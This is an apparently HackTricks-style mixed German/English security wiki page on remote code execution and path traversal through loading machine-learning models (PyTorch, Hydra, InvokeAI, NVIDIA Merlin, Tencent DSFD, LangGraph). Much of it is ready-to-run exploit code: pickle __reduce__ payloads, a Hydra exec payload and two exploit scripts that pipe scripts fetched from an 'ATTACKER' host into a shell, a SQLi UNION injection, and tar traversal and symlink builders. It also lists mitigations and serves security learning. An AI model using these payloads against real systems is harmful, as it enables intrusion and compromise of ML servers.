# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Machine Learning-Modelle werden normalerweise in verschiedenen Formaten geteilt, wie ONNX, TensorFlow, PyTorch usw. Diese Modelle können auf Entwickler-Maschinen oder Produktionssystemen geladen werden, um sie zu verwenden. Normalerweise sollten die Modelle keinen bösartigen Code enthalten, aber es gibt einige Fälle, in denen das Modell verwendet werden kann, um beliebigen Code auf dem System auszuführen, entweder als beabsichtigte Funktion oder wegen einer Schwachstelle in der Modell-Ladebibliothek.

Zum Zeitpunkt des Schreibens sind dies einige Beispiele für diese Art von Schwachstellen:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Unsichere Deserialisierung in* `torch.load` **(CVE-2025-32434)**                                                              | Bösartiges pickle in model checkpoint führt zu code execution (Umgehung des `weights_only`-Schutzes)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + bösartiger model download führt zu code execution; Java deserialization RCE in management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsichere checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Untrusted checkpoint löst pickle reducer während `load_model_trainer_states_from_checkpoint` aus → code execution im ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + unsafe MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Vom Benutzer kontrollierter `filter`-Key injiziert SQL/JSON-path-Syntax, `UNION SELECT` erzeugt eine gefälschte checkpoint row, danach importiert und ruft `msgpack`-Deserialisierung vom Angreifer gewählten Python code auf | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Laden eines models aus YAML verwendet `yaml.unsafe_load` (code exec) <br> Laden eines models mit **Lambda**-Layer führt beliebigen Python code aus          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Ein präpariertes `.tflite`-model löst integer overflow aus → heap corruption (potenzielles RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Laden eines models via `joblib.load` führt pickle mit dem `__reduce__`-Payload des Angreifers aus                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *strittig*                                                                              | `numpy.load` erlaubte standardmäßig gepickelte object arrays – bösartige `.npy/.npz` lösen code exec aus                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | Externer-weights-Pfad des ONNX-models kann das Verzeichnis verlassen (arbitrary files lesen) <br> Bösartiges ONNX-model tar kann arbitrary files überschreiben (führend zu RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model mit custom operator erfordert das Laden von nativen Code des Angreifers; komplexe model graphs missbrauchen Logik, um unbeabsichtigte Berechnungen auszuführen   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Die Verwendung der model-load API mit aktiviertem `--model-control` erlaubt relative path traversal, um files zu schreiben (z. B. `.bashrc` überschreiben für RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Fehlgeformte GGUF-model file verursacht heap buffer overflows im parser und ermöglicht arbitrary code execution auf dem Zielsystem                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Bösartiges HDF5 (`.h5`)-model mit Lambda-Layer code führt beim Laden weiterhin code aus (Keras safe_mode deckt altes Format nicht ab – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Viele ML-Tools (z. B. pickle-basierte model formats, Python `pickle.load`) führen beliebigen code aus, der in model files eingebettet ist, sofern nicht mitigiert | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata an `hydra.utils.instantiate()` übergeben **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Vom Angreifer kontrollierte model metadata/config setzt `_target_` auf beliebigen callable (z. B. `builtins.exec`) → ausgeführt während des load, selbst mit “safe” Formaten (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Außerdem gibt es einige auf Python pickle basierende models wie die von [PyTorch](https://github.com/pytorch/pytorch/security), die verwendet werden können, um beliebigen Code auf dem System auszuführen, wenn sie nicht mit `weights_only=True` geladen werden. Daher kann jedes pickle-basierte model besonders anfällig für diese Art von Angriffen sein, selbst wenn es nicht in der obigen Tabelle aufgeführt ist.

### Hydra metadata → RCE (works even with safetensors)

`hydra.utils.instantiate()` importiert und ruft jeden gepunkteten `_target_` in einem configuration/metadata object auf. Wenn Bibliotheken **untrusted model metadata** an `instantiate()` übergeben, kann ein Angreifer einen callable und Argumente bereitstellen, die sofort während des model load ausgeführt werden (kein pickle erforderlich).

Payload example (works in `.nemo` `model_config.yaml`, repo `config.json`, or `__metadata__` inside `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Key points:
- Vor der Modellinitialisierung in NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coders und FlexTok loaders ausgelöst.
- Hydra’s string block-list ist über alternative import paths umgehbar (z. B. `enum.bltns.eval`) oder über von der Anwendung aufgelöste Namen (z. B. `nemo.core.classes.common.os.system` → `posix`).
- FlexTok parst außerdem stringified metadata mit `ast.literal_eval`, was DoS (CPU-/Speicher-Explosion) vor dem Hydra-Aufruf ermöglicht.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` ist eine beliebte Open-Source-Weboberfläche für Stable-Diffusion. Versionen **5.3.1 – 5.4.2** stellen den REST-endpoint `/api/v2/models/install` bereit, der es Benutzern erlaubt, Modelle von beliebigen URLs herunterzuladen und zu laden.

Intern ruft der endpoint schließlich auf:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Wenn die gelieferte Datei ein **PyTorch-Checkpoint (`*.ckpt`)** ist, führt `torch.load` eine **pickle-Deserialisierung** aus. Da der Inhalt direkt von der benutzerkontrollierten URL stammt, kann ein Angreifer ein bösartiges Objekt mit einer benutzerdefinierten `__reduce__`-Methode in den Checkpoint einbetten; die Methode wird **während der Deserialisierung** ausgeführt und führt zu **remote code execution (RCE)** auf dem InvokeAI-Server.

Die Schwachstelle wurde als **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %) eingestuft.

#### Exploitation walk-through

1. Create a malicious checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Host `payload.ckpt` on einem HTTP-Server, den du kontrollierst (z. B. `http://ATTACKER/payload.ckpt`).
3. Trigger den verwundbaren Endpoint (keine Authentifizierung erforderlich):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Wenn InvokeAI die Datei herunterlädt, ruft es `torch.load()` auf → das `os.system`-Gadget wird ausgeführt und der Angreifer erhält Codeausführung im Kontext des InvokeAI-Prozesses.

Fertiges Exploit: **Metasploit**-Modul `exploit/linux/http/invokeai_rce_cve_2024_12029` automatisiert den gesamten Ablauf.

#### Bedingungen

•  InvokeAI 5.3.1-5.4.2 (scan flag standardmäßig **false**)  
•  `/api/v2/models/install` ist für den Angreifer erreichbar  
•  Prozess hat Berechtigungen, Shell-Befehle auszuführen

#### Mitigations

* Upgrade auf **InvokeAI ≥ 5.4.3** – der Patch setzt `scan=True` standardmäßig und führt vor der Deserialisierung Malware-Scanning durch.
* Beim programmgesteuerten Laden von Checkpoints `torch.load(file, weights_only=True)` oder den neuen [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security)-Helper verwenden.
* Allow-Lists / Signaturen für Model-Quellen erzwingen und den Service mit Least-Privilege ausführen.

> ⚠️ Denk daran, dass **jedes** Python-Pickle-basierte Format (einschließlich vieler `.pt`, `.pkl`, `.ckpt`, `.pth`-Dateien) von untrusted sources aus grundsätzlich unsicher zu deserialisieren ist.

---

Beispiel für eine ad-hoc-Mitigation, wenn ältere InvokeAI-Versionen hinter einem Reverse Proxy weiterlaufen müssen:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE via unsafe `torch.load` (CVE-2025-23298)

NVIDIAs Transformers4Rec (Teil von Merlin) hatte einen unsicheren Checkpoint-Loader, der direkt `torch.load()` auf vom Benutzer bereitgestellten Pfaden aufrief. Da `torch.load` auf Python `pickle` basiert, kann ein von einem Angreifer kontrollierter Checkpoint über einen Reducer während der Deserialisierung beliebigen Code ausführen.

Verwundbarer Pfad (vor dem Fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Warum das zu RCE führt: In Python pickle kann ein Objekt einen Reducer (`__reduce__`/`__setstate__`) definieren, der eine Callable und Argumente zurückgibt. Die Callable wird während des Unpickling ausgeführt. Wenn ein solches Objekt in einem Checkpoint vorhanden ist, läuft es, bevor irgendwelche Gewichte verwendet werden.

Minimales bösartiges Checkpoint-Beispiel:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Delivery vectors und blast radius:
- Trojanized checkpoints/models geteilt über repos, buckets oder artifact registries
- Automatisierte resume/deploy pipelines, die checkpoints automatisch laden
- Die Ausführung passiert innerhalb von training/inference workers, oft mit erhöhten Privilegien (z. B. root in containers)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) ersetzte das direkte `torch.load()` durch einen eingeschränkten, allow-listed deserializer, implementiert in `transformers4rec/utils/serialization.py`. Der neue loader validiert types/fields und verhindert, dass arbitrary callables während des load aufgerufen werden.

Defensive guidance spezifisch für PyTorch checkpoints:
- Unpickle keine untrusted data. Bevorzuge nicht-executable Formate wie [Safetensors](https://huggingface.co/docs/safetensors/index) oder ONNX, wenn möglich.
- Wenn du PyTorch serialization verwenden musst, stelle sicher, dass `weights_only=True` (in neueren PyTorch-Versionen unterstützt) gesetzt ist oder verwende einen custom allow-listed unpickler ähnlich dem Transformers4Rec patch.
- Erzwinge model provenance/signatures und sandbox deserialization (seccomp/AppArmor; non-root user; restricted FS und kein network egress).
- Achte auf unerwartete child processes von ML services zum Zeitpunkt des checkpoint load; trace `torch.load()`/`pickle` usage.

POC and vulnerable/patch references:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Example – crafting a malicious PyTorch model

- Create the model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Das Modell laden:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent’s FaceDetection-DSFD stellt einen `resnet`-Endpunkt bereit, der benutzerkontrollierte Daten deserialisiert. ZDI bestätigte, dass ein Remote-Angreifer ein Opfer dazu bringen kann, eine bösartige Seite/Datei zu laden, diese dazu veranlassen kann, einen präparierten serialisierten Blob an diesen Endpunkt zu senden, und die Deserialisierung als `root` auslösen kann, was zu einer vollständigen Kompromittierung führt.

Der Exploit-Flow entspricht dem typischen pickle-Missbrauch:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Jedes Gadget, das während der Deserialisierung erreichbar ist (Konstruktoren, `__setstate__`, Framework-Callbacks usw.), kann auf die gleiche Weise ausgenutzt werden, unabhängig davon, ob der Transport über HTTP, WebSocket oder eine Datei erfolgte, die in ein überwachte Verzeichnis abgelegt wurde.



### LangGraph checkpointer SQLi → MessagePack RCE

Diese Angriffskette ist interessant, weil der Angreifer **keine schädliche Modell-Datei hochladen muss**. Stattdessen stellt die Anwendung eine **AI-agent persistence API** (`get_state_history(..., filter=...)`) bereit, und Benutzereingaben gelangen in den Query Builder des Checkpointers.

#### 1. Strukturelle SQLi in Metadaten-Filtern

Ein verwundbares SQLite-Muster sah so aus:
```python
for query_key, query_value in filter.items():
operator, param_value = _where_value(query_value)
predicates.append(
f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
)
```
Der Wert wird später gebunden, aber `query_key` wird in den **JSON-Pfad-String** konkateniert, daher bricht ein `'` innerhalb des Dictionary-Keys aus `'$.{query_key}'` aus und injiziert SQL. Die gleiche Lektion gilt für **JSON-Pfade, Bezeichner, Operatoren, `LIMIT` und TTL-Felder**: Platzhalter schützen nur Werte, nicht die strukturelle Query-Syntax.

#### 2. `UNION SELECT` kann auf Downstream-Sinks abzielen, nicht nur auf Datendiebstahl

Die Query gibt `type` und serialisierte `checkpoint`-Bytes zurück, die später verwendet werden als:
```python
self.serde.loads_typed((type, checkpoint))
```
Das bedeutet, dass eine SQLi in der `WHERE`-Klausel eine **falsche Ergebniszeile** einschleusen kann:
```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```
Wenn späterer Code irgendeine ausgewählte Spalte parst, deserialisiert, schreibt oder ausführt, ordne diese Spalten ihren Sinks zu. In diesem Fall verwandelt die gefälschte Zeile SQLi in **attacker-controlled deserialization**.

#### 3. Unsafe MessagePack extension hooks sind gleichbedeutend mit code gadgets

Der `msgpack`-Pfad von LangGraph verwendete einen benutzerdefinierten Extension-Hook, der ein verschachteltes Tuple entpackte und ausführte:
```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```
So ein MessagePack-Extension-Object, das etwas kodiert, das `("os", "system", "id > /tmp/pwned")` entspricht, importiert `os`, löst `system` auf und führt den Befehl aus. Beim Review von AI-Frameworks sollten **custom MessagePack/JSON/pickle revivers** auf dynamische Imports, Reflection oder beliebiges Callable-Dispatch untersucht werden.

#### 4. Praktisches Audit-Muster für agent frameworks

Untersuche jegliche user-controlled input, die in Folgendes gelangt:
- state history / memory / replay / checkpoint listing APIs
- strukturierte Filter-Builder, die SQL- oder Redis-Query-Fragmente erzeugen
- custom deserializers (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- recovery paths, die Zeilen vertrauen, die von der persistence layer zurückgegeben werden

Diese konkrete Chain betraf self-hosted LangGraph-Deployments mit **SQLite**- oder **Redis**-checkpointers, wenn untrusted users `filter` kontrollieren konnten. In der Disclosure genannte gepatchte Versionen waren `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` und `langgraph-checkpoint 4.0.1+`.

## Models to Path Traversal

Wie in [**diesem Blogpost**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) kommentiert, basieren die von verschiedenen AI-Frameworks verwendeten Modelleformate meist auf Archiven, normalerweise `.zip`. Daher könnte es möglich sein, diese Formate auszunutzen, um path traversal attacks durchzuführen und so beliebige Dateien auf dem System zu lesen, auf dem das Modell geladen wird.

Zum Beispiel kannst du mit dem folgenden Code ein Modell erstellen, das beim Laden eine Datei im Verzeichnis `/tmp` erstellt:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Oder mit dem folgenden code kannst du ein model erstellen, das beim Laden einen symlink zum Verzeichnis `/tmp` erstellt:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Deep-dive: Keras .keras deserialization and gadget hunting

Für einen fokussierten Guide zu .keras internals, Lambda-layer RCE, dem arbitrary import issue in ≤ 3.8 und der post-fix gadget discovery innerhalb des allowlist, siehe:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [Unit 42 – Remote Code Execution With Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [Hydra block-list commit (warning about RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [Check Point Research – From SQLi to RCE: Exploiting LangGraph's Checkpointer](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)

{{#include ../banners/hacktricks-training.md}}
